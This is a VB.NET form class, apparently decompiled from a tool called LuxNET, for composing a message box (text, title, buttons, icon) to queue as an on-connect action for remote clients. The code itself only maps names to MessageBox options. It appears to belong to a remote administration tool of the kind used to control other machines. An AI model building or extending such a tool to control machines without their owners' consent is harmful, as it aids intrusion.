Imports ComponentOwl.BetterListView
Imports LuxNET.My
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Public Class SendMessageBox

    Public Sub New()
        Me.onconnect = False
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Me.onconnect Then
            Dim item As BetterListViewItem = My.Forms.FormMain.LV_OnConnect.Items.Add(My.Forms.FormMain.ComboBox1.SelectedItem.ToString, 5)
            item.SubItems.Add(String.Format("Body: {0} Title: {1} Button: {2} Icon: {3}", New Object() {Me.RichTextBox1.Text, Me.TextBox1.Text, Me.ComboBox2.Text, Me.ComboBox1.Text})).Tag = (String.Format("{0}|{1}|{2}|{3}", New Object() {Me.RichTextBox1.Text, Me.TextBox1.Text, RuntimeHelpers.GetObjectValue(Me.MessageBoxButton(Me.ComboBox2.Text)), RuntimeHelpers.GetObjectValue(Me.MessageBoxIcn(Me.ComboBox1.Text))}))
            item.SubItems.Add(Me.actionfor)
            item = Nothing
            Me.Close()
        End If
        My.Forms.FormMain.messageboxresult.Text = String.Format("{0}|{1}|{2}|{3}", New Object() {Me.RichTextBox1.Text, Me.TextBox1.Text, RuntimeHelpers.GetObjectValue(Me.MessageBoxButton(Me.ComboBox2.Text)), RuntimeHelpers.GetObjectValue(Me.MessageBoxIcn(Me.ComboBox1.Text))})
        Me.Close()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Me.pb_icon.Image = Me.MessageBoxIcntobitmap(Me.ComboBox1.Text)
    End Sub

    Public Function MessageBoxButton(ByVal [Text] As String) As Object
        Select Case [Text]
            Case "AbortRetryIgnore"
                Return MessageBoxButtons.AbortRetryIgnore
            Case "OK"
                Return MessageBoxButtons.OK
            Case "OKCancel"
                Return MessageBoxButtons.OKCancel
            Case "RetryCancel"
                Return MessageBoxButtons.RetryCancel
            Case "YesNo"
                Return MessageBoxButtons.YesNo
            Case "YesNoCancel"
                Return MessageBoxButtons.YesNoCancel
        End Select
        Return MessageBoxButtons.OK
    End Function

    Public Function MessageBoxIcn(ByVal [text] As String) As Object
        Select Case [text]
            Case "Asterisk"
                Return MessageBoxIcon.Asterisk
            Case "Error"
                Return MessageBoxIcon.Hand
            Case "Exclamation"
                Return MessageBoxIcon.Exclamation
            Case "Hand"
                Return MessageBoxIcon.Hand
            Case "Information"
                Return MessageBoxIcon.Asterisk
            Case "None"
                Return MessageBoxIcon.None
            Case "Question"
                Return MessageBoxIcon.Question
            Case "Stop"
                Return MessageBoxIcon.Hand
            Case "Warning"
                Return MessageBoxIcon.Exclamation
        End Select
        Return MessageBoxIcon.None
    End Function

    Public Function MessageBoxIcntobitmap(ByVal [text] As String) As Bitmap
        Select Case [text]
            Case "Asterisk"
                Return SystemIcons.Asterisk.ToBitmap
            Case "Error"
                Return SystemIcons.Error.ToBitmap
            Case "Exclamation"
                Return SystemIcons.Exclamation.ToBitmap
            Case "Hand"
                Return SystemIcons.Hand.ToBitmap
            Case "Information"
                Return SystemIcons.Information.ToBitmap
            Case "None"
                Return SystemIcons.WinLogo.ToBitmap
            Case "Question"
                Return SystemIcons.Question.ToBitmap
            Case "Stop"
                Return SystemIcons.Error.ToBitmap
            Case "Warning"
                Return SystemIcons.Warning.ToBitmap
        End Select
        Return SystemIcons.WinLogo.ToBitmap
    End Function

    Public actionfor As String
    Public onconnect As Boolean
End Class